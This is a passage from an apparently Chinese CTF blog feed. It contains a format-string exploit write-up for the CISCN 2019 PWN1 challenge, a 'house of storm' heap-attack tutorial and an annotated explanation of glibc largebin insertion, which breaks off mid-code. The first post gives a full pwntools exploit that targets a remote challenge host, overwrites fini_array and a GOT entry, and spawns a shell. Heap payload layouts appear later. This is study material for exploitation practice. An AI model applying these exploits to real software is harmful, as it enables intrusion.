哪怕是%0x10000c 所占用的字节数也只为9</p><p>这就使得哪怕题目限制了我们利用格式化字符漏洞的payload的字节数 我们仍然可以保证任意写的攻击</p><p>但是这仍然不够完美 我们还有没有更好的办法来修改got表这样的地址其值</p><p>我们来看一下函数的got表 在32位情况下 其存储的值是如何占用这四个字节</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303142118643.png" title="image-20230314211853603" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303142118643.png" alt="image-20230314211853603"></a></p><p>可以看到是小端序存储 并且一个字节对应着两个数字</p><p>那么比如说printf函数中的got表  高位的0x08 对应的地址为0x804989c + 3</p><p>如果我们只需要修改高位的值 就可以往这个地址写入单字节 利用 ‘h’来构造格式化字符</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = &quot;%&quot;+str(要修改的值).encode()+&quot;c%偏移$hhn&quot;</span><br><span class="line">payload += p64(地址)</span><br></pre></td></tr></table></figure><h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2><p>下面利用一道国赛题来帮助理解</p><p><strong>[CISCN 2019西南]PWN1</strong></p><p>查看一下保护机制</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303142127049.png" title="image-20230314212727020" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303142127049.png" alt="image-20230314212727020"></a></p><p>没有开启Partical RELRO 或者是Full RELRO 那么可以fini_array处就有可写的权限 </p><p>ida看一下伪代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> format[<span class="number">68</span>]; <span class="comment">// [esp+0h] [ebp-48h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to my ctf! What&#x27;s your name?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%64s&quot;</span>, format);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(format);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时还提供了system函数</p><p>只有一次格式化字符串的机会 既然可以修改fini_array 那么我们首先想到的就是利用格式化字符串漏洞 将fini_array修改为main函数的地址</p><p>不过实际攻击效果和我预期的有点不一样 在第二次执行完main函数以后就没有办法再次返回了 估计是栈空间不够的锅 那没办法 就只能在第一次格式化字符串的时候就同时修改fini_array和printf函数的got表</p><p>就是这里 利用fmstr_payload构造出来的payload无法达到预期的攻击效果 所以我们采用手写的方式</p><p>首先是计算一下偏移 这个就不详细展开了 最后发现的偏移是4</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fini_addr = <span class="number">0x804979C</span></span><br><span class="line">main_addr = <span class="number">0x8048534</span></span><br><span class="line">printf_got = <span class="number">0x804989c</span></span><br><span class="line">system_addr = <span class="number">0x80483d0</span></span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x0804</span>).encode()+<span class="string">b&#x27;c%15$hn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%16$hn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x83d0</span>-<span class="number">0x0804</span>).encode()+<span class="string">b&#x27;c%17$hn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x8534</span>-<span class="number">0x83d0</span>).encode()+<span class="string">b&#x27;c%18$hnaa&#x27;</span></span><br><span class="line">payload += p32(fini_addr+<span class="number">2</span>)</span><br><span class="line">payload += p32(printf_got+<span class="number">2</span>)</span><br><span class="line">payload += p32(printf_got)</span><br><span class="line">payload += p32(fini_addr)</span><br></pre></td></tr></table></figure><p>首先我们要清楚一点 如果单次格式化字符利用想要修改多个地址值 那么后面需要修改的值一定是要大于前面的</p><p>因为前面%c输出的空字符 也算到后面的总字节数里面的 为了防止修改的值超出预期 所以需要把较大的数值安排到后面</p><p>还有一点是为什么要用str().encode()的形式 是因为python3 byte型和字符型的要求</p><p>完整exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28573</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&quot;i386&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">fini_addr = <span class="number">0x804979C</span></span><br><span class="line">main_addr = <span class="number">0x8048534</span></span><br><span class="line">printf_got = <span class="number">0x804989c</span></span><br><span class="line">system_addr = <span class="number">0x80483d0</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Welcome to my ctf! What&#x27;s your name?&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x0804</span>).encode()+<span class="string">b&#x27;c%15$hn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%16$hn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x83d0</span>-<span class="number">0x0804</span>).encode()+<span class="string">b&#x27;c%17$hn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x8534</span>-<span class="number">0x83d0</span>).encode()+<span class="string">b&#x27;c%18$hnaa&#x27;</span></span><br><span class="line">payload += p32(fini_addr+<span class="number">2</span>)</span><br><span class="line">payload += p32(printf_got+<span class="number">2</span>)</span><br><span class="line">payload += p32(printf_got)</span><br><span class="line">payload += p32(fini_addr)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Welcome to my ctf! What&#x27;s your name?&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh&#x27;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> stack </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>house of storm</title>
      <link href="/2023/03/13/house-of-storm/"/>
      <url>/2023/03/13/house-of-storm/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一种结合了unsortedbin attack和largebin attack的攻击办法 可以达到任意地址写的效果</p><p>在学习这两个漏洞的时候 其各自效能不大 unsortedbin 受限于对于fake chunk的size域和bk域的检查</p><p>largebin attack受限于其只能单一的在任意地址写堆地址</p><p>但是如果将二者结合起来 就可以达到任意地址申请chunk的效果</p><p>不过这个办法也是旧时代的眼泪了 在libc2.30以后就诞生了新的检查机制来防止</p><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>首先我们要清楚整个漏洞的触发流程 先是利用unsortedbin chunk放入到largebin chunk中 从而将fake chunk链入unsorted_chunks (av)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">   unsorted_chunks (av)-&gt;bk = bck;  <span class="comment">// 把 fake_chunk 链入 unsorted_chunks(av)</span></span><br><span class="line">   bck-&gt;fd = unsorted_chunks (av);  <span class="comment">// 把 fake_chunk 的 fd 改成 unsorted_chunks (av)</span></span><br></pre></td></tr></table></figure><p>同时还可以将fake chunk的fd域修改为unsorted_chunks (av)</p><p>为了达到这一目的 我们就需要更改unsortedbin chunk的bk域为fakechunk_addr - 0x10</p><p>这里之所以还要减去0x10 是为了腾出size域和prev_size域的空间</p><p>紧接着我们需要利用largebin attack来写fake chunk的size域 以及完善fake chunk的结构 以供绕过双向链表的检测</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                          victim-&gt;fd_nextsize = fwd; <span class="comment">//unsortedbin的fd_nextsize域被设置为了largebin chunk的首地址</span></span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; <span class="comment">//unsortebin的bk_nextsize域被设置为largebin的bk_nextsize</span></span><br><span class="line">                          fwd-&gt;bk_nextsize = victim; <span class="comment">//把largebin的bk_nextsize域设置为unsortedbin的首地址</span></span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<span class="comment">//这里就是伪造size的关键句 将unsortedbin的bk_nextsize指向的地址+0x20处填入unsortedbin地址</span></span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          mark_bin (av, victim_index);</span><br><span class="line">          victim-&gt;bk = bck;  <span class="comment">//把 unsorted bin 里刚放进的 chunk-&gt;bk 改为 large bin-&gt;bk</span></span><br><span class="line">          victim-&gt;fd = fwd;  <span class="comment">//把 unsorted bin 里刚放进的 chunk-&gt;fd 改为 large bin</span></span><br><span class="line">          fwd-&gt;bk = victim;  <span class="comment">//把 large bin 的 chunk-&gt;bk 改为 unsorted bin 里刚放进的 chunk 的首地址</span></span><br><span class="line">          bck-&gt;fd = victim;  <span class="comment">//这里伪造了fake chunk的bk域 </span></span><br><span class="line"><span class="comment">//bck = fwd-&gt;bk</span></span><br><span class="line"><span class="comment">//bck-&gt;fd = (fwd-&gt;bk)+0x10</span></span><br></pre></td></tr></table></figure><h2 id="实际利用"><a href="#实际利用" class="headerlink" title="实际利用"></a>实际利用</h2><p>为了配合上述的源代码 我们需要将两个chunk的布局构造成下面这样</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ptr_addr = 你想要任意写的地址-<span class="number">0x10</span></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(ptr_addr) <span class="comment">#unsortedbin</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(ptr_addr+<span class="number">0x8</span>)+p64(<span class="number">0</span>)+p64(ptr_addr-<span class="number">0x18</span>-<span class="number">5</span>) <span class="comment">#largebin</span></span><br></pre></td></tr></table></figure><p>具体的数值计算就自己根据源码来看了 应该挺好懂的  还有一点需要注意的就是unsoretbin chunk和largebin chunk的释放时机</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x418</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x408</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#2  largebin</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x418</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#4  unsortedbin</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">ptr_addr = <span class="number">0xABCD0500</span>-<span class="number">0x10</span></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(ptr_addr)</span><br><span class="line">edit(<span class="number">4</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(ptr_addr+<span class="number">0x8</span>)+p64(<span class="number">0</span>)+p64(ptr_addr-<span class="number">0x18</span>-<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x48</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">debug()</span><br></pre></td></tr></table></figure><p>你可以看到 要先释放largebin chunk 这是因为要将size小的放在链表头 不然后续无法将其放入largebin</p><p>总体利用还是比较简单的 难在理解</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> heap </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>LargebinAttack</title>
      <link href="/2023/03/04/LargebinAttack/"/>
      <url>/2023/03/04/LargebinAttack/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="Largebin介绍"><a href="#Largebin介绍" class="headerlink" title="Largebin介绍"></a>Largebin介绍</h2><p>Largebin用来收容超过0x400大小以上的chunk(64位) 其是一个双向链表<br>一共可以容纳63个chunk 和fastbin等不同的是 其对于链表对应存储chunk的大小没有明确规定 而是一个范围<br>一共分为6组<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303061950411.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303061950411.png" alt="image.png"></a><br>这里的差值(以字节为单位)是一个什么意思呢  比如在组别1中 现在释放三个chunk到largebin中 chunkA的大小是0x400 chunkB的大小是0x410 chunkC的大小是0x450<br>此时由于chunkC和chunkA的差值大于了64字节 所以chunkA和chunkB是位于同一组中 chunkC是另外一组<br>这在largebin这个双向链表中是一个什么情形呢 我们知道 largebin相对于unsortedbin多出来两个域 一个fd_nextsize 一个bk_nextsize<br>这两个域和fd和bk的域差距在哪里呢?<br>在largebin中 不同组的排列是根据从大到小来的 方便其遍历<br>fd_nextsize指向的是比当前组别小的组中最大的组<br>bk_nextsize指向的是比当前组别大的组中最小的组<br>而fd和bk则是用来指向组内的chunk<br>这么说可能不太好理解 用一张图来演示一下<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303062026756.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303062026756.png" alt="image.png"></a><br>size最大的chunk的bk_nextsize指向最小的chunk<br>size最小的chunk的fd_nextsize指向最大的chunk<br>并且相同大小的chunk只有链表头的fd_nextsize和bk_nextsize才有值 其余为0</p><h2 id="Largebin中chunk的插入取出机制"><a href="#Largebin中chunk的插入取出机制" class="headerlink" title="Largebin中chunk的插入取出机制"></a>Largebin中chunk的插入取出机制</h2><h3 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h3><h4 id="源码理解"><a href="#源码理解" class="headerlink" title="源码理解"></a>源码理解</h4><p>来看看glibc源码是如何逐步使得chunk插入到largebin链表中</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* place chunk in bin */</span></span><br><span class="line"> </span><br><span class="line">         <span class="keyword">if</span> (in_smallbin_range (size))        <span class="comment">//如果是smallbin的大小就放到smallbin</span></span><br><span class="line">           &#123;</span><br><span class="line">             victim_index = smallbin_index (size);</span><br><span class="line">             bck = bin_at (av, victim_index);</span><br><span class="line">             fwd = bck-&gt;fd;</span><br><span class="line">           &#125;</span><br><span class="line">         <span class="keyword">else</span>                                                    <span class="comment">//如果是largebin的大小，那么：</span></span><br><span class="line">           &#123;</span><br><span class="line">             victim_index = largebin_index (size);<span class="comment">//根据size获取对应的largebin索引</span></span><br><span class="line">             bck = bin_at (av, victim_index);         <span class="comment">//获取largebin表头</span></span><br><span class="line">             fwd = bck-&gt;fd;                                             <span class="comment">//获取对应索引largebin的第一个chunk（循环链表的head-&gt;next）</span></span><br><span class="line"> </span><br><span class="line">             <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">             <span class="keyword">if</span> (fwd != bck)                                            <span class="comment">//当第一个不等于最后一个（即当前的largebin不空）</span></span><br><span class="line">               &#123;</span><br><span class="line">                 <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                 size |= PREV_INUSE;</span><br><span class="line">                 <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                 assert (chunk_main_arena (bck-&gt;bk));    <span class="comment">//是否在main_arena?（主线程）</span></span><br><span class="line">                 <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size)</span><br><span class="line">             &lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))<span class="comment">//bck-&gt;bk储存的是当前索引的largebin中大小最小的chunk，如果我们要插入的chunk比这个大小还小，那么就要插入largebin的尾部。</span></span><br><span class="line">                   &#123;</span><br><span class="line">                     fwd = bck;                                    <span class="comment">//fwd此时为largebin表头</span></span><br><span class="line">                     bck = bck-&gt;bk;                            <span class="comment">//bck设置为largebin中最后一个的chunk</span></span><br><span class="line"> </span><br><span class="line">                     victim-&gt;fd_nextsize = fwd-&gt;fd;<span class="comment">//由于我们要插入的在末尾，比他小的就是循环回去的第一个chunk</span></span><br><span class="line">                     victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<span class="comment">//比他大的就是之前的最小的那个</span></span><br><span class="line"> </span><br><span class="line">                     <span class="comment">//原来链表的第一个chunk的bk指向此时新插入的最后一个chunk</span></span><br><span class="line">                     fwd-&gt;fd-&gt;bk_nextsize =</span><br><span class="line">                     victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                   &#125;</span><br><span class="line"> </span><br><span class="line">                 <span class="comment">// 如果不是插入尾部，那么我们要找到这个chunk应该插入的位置</span></span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                   &#123;</span><br><span class="line">                     assert (chunk_main_arena (fwd));</span><br><span class="line">                     <span class="comment">//使用这个while循环尝试从链表头部开始遍历，直到找到一个比victim大或等于的chunk退出while</span></span><br><span class="line">                     <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class="line">                       &#123;</span><br><span class="line">                         fwd = fwd-&gt;fd_nextsize;            <span class="comment">//取下一个</span></span><br><span class="line">                                                 assert (chunk_main_arena (fwd));<span class="comment">//检查分配区</span></span><br><span class="line">                       &#125;</span><br><span class="line"> </span><br><span class="line">                     <span class="comment">//如果找到了跟他想等的</span></span><br><span class="line">                     <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size</span><br><span class="line">                                             == (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (fwd))</span><br><span class="line">                       <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                       fwd = fwd-&gt;fd;<span class="comment">//直接将victim插入他的后面（通过fd），不修改nextsize指针。</span></span><br><span class="line"> </span><br><span class="line">                     <span class="comment">//如果大小不一样(即此时fwd是相邻的大于victim的chunk)</span></span><br><span class="line">                     <span class="comment">//需要构造nextsize双向链表，构造新节点,victim作为堆头</span></span><br><span class="line">                     <span class="keyword">else</span></span><br><span class="line">                       &#123;</span><br><span class="line">                         <span class="comment">//比victim小的指向fwd</span></span><br><span class="line">                         <span class="comment">//比victim大的指向fwd的bk_nextsize（比fwd大的那个）</span></span><br><span class="line">                         <span class="comment">//相当于插入了fwd与fwd-&gt;bk_nextsize之间</span></span><br><span class="line">                         victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                         victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line"> </span><br><span class="line">                         <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))<span class="comment">//检查size链完整性</span></span><br><span class="line">                           malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class="line">                         <span class="comment">//对应的去改fwd的相关指针成链</span></span><br><span class="line">                         fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                         victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                         <span class="comment">//插入完成</span></span><br><span class="line">                       &#125;</span><br><span class="line"> </span><br><span class="line">                     bck = fwd-&gt;bk;</span><br><span class="line">                     <span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">                       malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">             <span class="keyword">else</span></span><br><span class="line">               victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<span class="comment">//此时victim为唯一的chunk，也要做循环链表</span></span><br><span class="line">           &#125;</span><br><span class="line">                   <span class="comment">//放到对应的 bin 中，构成 bk&lt;--&gt;victim&lt;--&gt;fwd。</span></span><br><span class="line">         mark_bin (av, victim_index);    <span class="comment">//标识bitmap</span></span><br><span class="line">         victim-&gt;bk = bck;</span><br><span class="line">         victim-&gt;fd = fwd;</span><br><span class="line">         fwd-&gt;bk = victim;</span><br><span class="line">         bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure><p>上述的源码注释来源自</p><p>[<a href="https://bbs.kanxue.com/thread-262424.htm#msg_header_h3_4">原创]Largebin attack总结-二进制漏洞-看雪论坛-安全社区|安全招聘|bbs.pediy.com (kanxue.com)</a></p><p>以下是我自己对于这个过程的理解</p><p>1.释放一个chunk后 首先对其大小进行判断 区分到smallbin或者是largebin 这里不讨论smallbin的情况</p><p>2.根据当前chunk的size 来索引对应的index 并且获得两个位于链表中chunk的指针 fwd指向链表头 也就是最大的chunk</p><p>bck指向最小的chunk</p><p>3.对于fwd和bck进行判断 如果二者相等 那么此时链表中就为空 直接将chunk放置为链表头 如果二者不相同 那么链表不为空 分为两种情况 如果chunk的size不是当前链表中最小的 从链表头开始 根据fd_nextsize指针来从大到小依次对比链表中原有的chunk大小和要插入的chunk大小 如果没有找到 那么就在对应合适的位置将当前chunk置为对应的链表头 其fd_nextsize和bk_nextsize各自指向对应的链表 如果找到了 就接入对应链表中 fd_nextsize和bk_nextsize为0 </p><p>4.如果当前chunk的size是当前链表中最小的 那么就直接放置到链表末尾 如果作为链表头 fd_nextsize指向最大的chunk的链表头 构成一个循环 bk_nextsize指向比当前链表更大一点的链表 如果链表尾的大小与要插入的chunk大小一致 那么就接在对应链表中</p><h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><p>接下来我们来调试一番                 </p><p>调试环境  </p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303081908421.png" title="image-20230308190814310" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303081908421.png" alt="image-20230308190814310"></a>                                            </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x410</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">debug()</span><br></pre></td></tr></table></figure><p>chunk1用来防止chunk0释放以后和top chunk合并 </p><p>此时chunk0释放以后优先进入unsortedbin</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303081909563.png" title="image-20230308190941528" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303081909563.png" alt="image-20230308190941528"></a></p><p>要使得重新分配unsortedbin中的chunk 就需要我们申请一个超过unsortedbin中所有chunk大小的堆块 这样就会把unsortedbin中所有的chunk分配到largebin或者smallbin中</p><p>否则则将大小足够分配申请的chunk的free chunk分配出所需要的大小 其余unsortedbin中的chunk各自检验大小放入到largebin中</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x450</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x490</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x460</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">debug()</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303081921911.png" title="image-20230308192148869" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303081921911.png" alt="image-20230308192148869"></a></p><p>接着我们来看看双链表结构大概是一个什么样子</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x450</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x490</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x550</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">debug()</span><br></pre></td></tr></table></figure><p>申请三个大小足够放入到largebin的chunk 并且为了防止物理相邻合并用0x10大小的chunk隔开 最后申请一个大chunk将unsortedbin的chunk分配到largebin中 此时预期这三个chunk应该各自成为链表头</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303081929027.png" title="image-20230308192948996" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303081929027.png" alt="image-20230308192948996"></a></p><p>此时我们在原来的基础上再多申请一个0x450大小的chunk 不出意外应该是分配到0x440链表后</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303081934374.png" title="image-20230308193401341" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303081934374.png" alt="image-20230308193401341"></a></p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303081934744.png" title="image-20230308193409699" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303081934744.png" alt="image-20230308193409699"></a></p><p>可以看到只有位于链表头的chunk的fd_nextsize和bk_nextsize才有值</p><p>具体的利用手法等下来讲吧 更进一步的调试可以自己尝试</p><h3 id="取出"><a href="#取出" class="headerlink" title="取出"></a>取出</h3><h4 id="源码理解-1"><a href="#源码理解-1" class="headerlink" title="源码理解"></a>源码理解</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">         If a large request, scan through the chunks of current bin in</span></span><br><span class="line"><span class="comment">         sorted order to find smallest that fits.  Use the skip list for this.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range (nb))<span class="comment">//如果不在samllbin大小中</span></span><br><span class="line">        &#123;</span><br><span class="line">          bin = bin_at (av, idx); <span class="comment">//找到申请的size对应的largebin链表</span></span><br><span class="line"> </span><br><span class="line">          <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">          <span class="keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;                    <span class="comment">//此时victim为链表的第一个节点</span></span><br><span class="line">              (<span class="type">unsigned</span> <span class="type">long</span>) (victim-&gt;size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb)) <span 